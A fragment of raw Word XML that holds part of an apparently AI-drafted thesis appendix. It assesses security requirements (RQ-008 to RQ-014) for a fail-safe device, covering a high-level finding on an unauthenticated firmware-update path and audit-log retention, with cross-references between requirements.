          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>single decisive vulnerability</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>a fail-safe device whose residual risk collapses onto one un-authenticated firmware-update path (RQ-005 integrity + RQ-011 authorization), the sole class that escapes the black-channel fail-safe design (RQ-010 G-3)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — atop an audit subsystem too volatile to retain evidence (RQ-012) and too open to restrict it (RQ-014), with </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorization systematically delegated to the "safe-zone" assumption (RQ-011)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06F6EF6A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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Recommended next step — consolidation.</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> I can now generate the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>complete formatted thesis appendix (Word .docx)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: cover page + methodology note; the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">master </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ→CR→Asset→Threat→SVV→Test-Case</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> traceability matrix</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; all fourteen </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>corrected</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> analyses; the per-requirement conformance-verdict table; the clean boundary map above; and the seven-theme cross-cutting synthesis.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4B640A" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00483B71" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Shall I**(a)** build that full .docx appendix now, or**(b)** produce the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>consolidated master traceability matrix + conformance-verdict table</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as an .xlsx first for your review?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38B5F16B" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67DC8092" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77EB5A2C" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="656EAE41" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B6CB20A" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A9FB8D8" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33367308" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="369FA701" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3758DCBA" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="374C61CB" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="109249FE" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DD4305C" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31189CF0" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="566DE5CB" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E5696F8" w14:textId="77777777" w:rsidR="00991EFB" w:rsidRDefault="00991EFB" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18EB19F0" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FC51B49" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CB02800" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29F5556F" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E3C2C57" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7853D132" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45C74D9F" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4811E3C8" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EE0A342" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C947E37" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77BFA8E4" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="574F34A6" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="685AB08B" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EF9B99B" w14:textId="77777777" w:rsidR="00483B71" w:rsidRDefault="00483B71" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D6B87AC" w14:textId="77777777" w:rsidR="00EB0F23" w:rsidRDefault="00EB0F23" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A1ADE53" w14:textId="2554C82E" w:rsidR="00A366E1" w:rsidRDefault="00A366E1" w:rsidP="00A366E1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lastRenderedPageBreak/>
        <w:t xml:space="preserve">REQUIREMENT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>12</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BB6C145" w14:textId="77777777" w:rsidR="00EB0F23" w:rsidRDefault="00EB0F23" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="206EE933" w14:textId="77777777" w:rsidR="00EB0F23" w:rsidRDefault="00EB0F23" w:rsidP="002D754B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D2D0AC2" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-012 — Reprocessed (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34026FBF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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Correction applied:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-012 was the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cleanest non-conformity</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the set and needed the least correction — its two conflicts (deletion + capacity) are confirmed and stand. The recheck is therefore about </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>boundary hygiene</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> with its three </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>neighbours</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, all of which I now enforce as cross-references rather than re-owned material:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C85BFDC" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Self-erasing </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>install</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> reboot → cross-reference RQ-008.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> My original G-1 correctly introduced the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>mandatory annual reboot (SRIO-1812)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as RQ-012's </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>own</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> structural retention-killer — that is unique to this general-retention requirement and stays. But the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>firmware-install reboot</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> self-erasing property is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008's finding (G-3)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — I now cite it as a cross-reference, not a co-owned mechanism.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121E5416" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Incomplete </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>scope</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of retained data → cross-reference RQ-003/008/009.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> My original G-3 noted the log "excludes physical interventions." That is a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>collection-completeness</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> point (what the log </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>captures</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">), owned by </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-003</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (physical), </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (software), </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-009</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (config). RQ-012 is about </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>retention duration</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, so I reframe this as a cross-reference: </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>even the retained fragment is incomplete because collection is incomplete elsewhere.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308C7874" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Version-history retention → RQ-013; access-restriction → RQ-014.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-012 is the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>general</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 5-year tracing log; the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SW-version-per-upload</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> retention is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-013</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>access restriction</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the log is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-014</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (the audit paradox is framed there). </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:t xml:space="preserve">RQ-012 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:t>does</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:t>test</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:t>version</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:t>history</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:t>or</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:t>access</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:t>control</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F5D747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>Everything else — CR mapping completion, the precision correction on "warm-reset survival," and the compound time-attribution point — was correct and is retained.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D50902A" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:pict w14:anchorId="14415305">
          <v:rect id="_x0000_i1816" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B77F24" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6895406C" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
